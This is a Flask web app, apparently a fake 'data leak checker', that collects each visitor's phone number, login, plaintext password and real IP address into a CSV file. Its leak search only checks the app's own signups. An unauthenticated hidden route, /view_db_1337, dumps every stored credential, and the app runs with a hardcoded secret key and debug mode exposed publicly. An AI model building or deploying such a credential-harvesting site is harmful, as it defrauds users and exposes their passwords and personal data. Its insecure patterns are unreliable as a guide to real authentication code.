import os
from flask import Flask, render_template, request, redirect, session, url_for
import csv

# Настройка путей
base_dir = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__, 
            template_folder=os.path.join(base_dir, 'templates'),
            static_folder=os.path.join(base_dir, 'static'))

app.secret_key = 'red_black_secret'
DB_FILE = os.path.join(base_dir, 'users.csv')

# Инициализация базы
if not os.path.exists(DB_FILE):
    with open(DB_FILE, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['phone', 'login', 'password', 'ip'])

# --- НОВЫЙ МАРШРУТ ДЛЯ ПРОСМОТРА БАЗЫ ---
@app.route('/view_db_1337')
def view_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
        return f"<h3>Содержимое базы (CSV):</h3><pre>{content}</pre>"
    return "Файл базы данных еще не создан."
# ---------------------------------------

@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        phone = request.form.get('phone')
        login = request.form.get('login')
        password = request.form.get('password')
        
        # Исправлено для хостинга: получаем реальный IP
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
        
        with open(DB_FILE, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow([phone, login, password, user_ip])
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        login_input = request.form.get('login')
        pass_input = request.form.get('password')
        
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    if row['login'] == login_input and row['password'] == pass_input:
                        session['user'] = login_input
                        return redirect(url_for('dashboard'))
        return "Ошибка! Неверный логин или пароль."
    return render_template('login.html')

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if 'user' not in session:
        return redirect(url_for('login'))
    
    result = None
    if request.method == 'POST':
        search_phone = request.form.get('search_phone')
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            found = any(row['phone'] == search_phone for row in reader)
            result = "НАЙДЕНО В УТЕЧКЕ" if found else "НЕ НАЙДЕНО"
            
    return render_template('dashboard.html', result=result)

if __name__ == '__main__':
    # Настройка порта для Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=True, use_reloader=False)
